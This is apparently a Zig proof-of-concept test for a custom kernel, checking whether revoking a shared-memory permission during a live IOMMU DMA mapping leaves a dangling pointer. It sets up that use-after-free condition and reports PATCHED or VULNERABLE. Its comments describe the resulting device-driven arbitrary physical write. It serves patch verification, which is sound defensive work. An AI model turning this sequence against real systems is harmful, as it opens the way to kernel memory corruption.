// PoC for 946cf21: sysRevokePerm(.shared_memory) DMA-lifetime UAF.
//
// Pre-patch: sysRevokePerm dropped the last *SharedMemory ref without
// walking proc.dma_mappings. DmaMapping holds shm as a raw pointer (no
// counted ref), so revoke succeeded even with a live IOMMU mapping —
// the IOMMU page table kept routing device DMA at physical frames the
// PMM had already recycled (device-driven arbitrary phys write), and
// proc.dma_mappings was left holding a dangling *SharedMemory.
//
// Post-patch: sysRevokePerm walks proc.dma_mappings and refuses with
// E_BUSY (-11) if any active DmaMapping still references the SHM.
//
// Differential observed from userspace: the return value of
// sys_revoke_perm(shm_handle) while a DMA mapping is live.
//   pre-patch  -> 0          (revoke succeeds; UAF latent)
//   post-patch -> -11 E_BUSY (revoke refused)
//
// PoC sequence:
//   1. Resolve the q35 AHCI MMIO device handle from perm_view.
//   2. shm_create_with_rights(4096, RW).
//   3. mem_dma_map(dev, shm) — populates IOMMU page table and
//      proc.dma_mappings with shm as a raw ptr.
//   4. revoke_perm(shm) — observe ret.
//
// We also try mem_dma_unmap afterwards as a sanity probe in the
// VULNERABLE branch (it should fail post-revoke since the perm entry
// is gone, but the dma_mappings slot still references the freed shm).

const lib = @import("lib");

const perm_view = lib.perm_view;
const perms = lib.perms;
const syscall = lib.syscall;
const t = lib.testing;

const E_BUSY: i64 = -11;

pub fn main(pv: u64) void {
    const view: [*]const perm_view.UserViewEntry = @ptrFromInt(pv);

    const dev = t.requireMmioDevice(view, "POC-946cf21");
    const dev_handle = dev.handle;

    const rights = (perms.SharedMemoryRights{ .read = true, .write = true }).bits();
    const shm_h_i: i64 = syscall.shm_create_with_rights(4096, rights);
    if (shm_h_i < 0) {
        syscall.write("POC-946cf21: SETUP_FAIL shm_create\n");
        syscall.shutdown();
    }
    const shm_h: u64 = @bitCast(shm_h_i);

    const dma_ret = syscall.mem_dma_map(dev_handle, shm_h);
    if (dma_ret <= 0) {
        syscall.write("POC-946cf21: SETUP_FAIL mem_dma_map\n");
        syscall.shutdown();
    }

    // Live IOMMU mapping holds shm via a raw ptr in proc.dma_mappings.
    // Try to revoke the SHM permission while that mapping is active.
    const ret = syscall.revoke_perm(shm_h);

    if (ret == E_BUSY) {
        syscall.write("POC-946cf21: PATCHED (revoke refused with E_BUSY while DMA mapping live)\n");
    } else if (ret == 0) {
        syscall.write("POC-946cf21: VULNERABLE (revoke succeeded; IOMMU mapping now dangling, proc.dma_mappings has stale *SharedMemory)\n");
    } else {
        syscall.write("POC-946cf21: UNEXPECTED revoke ret\n");
    }

    syscall.shutdown();
}
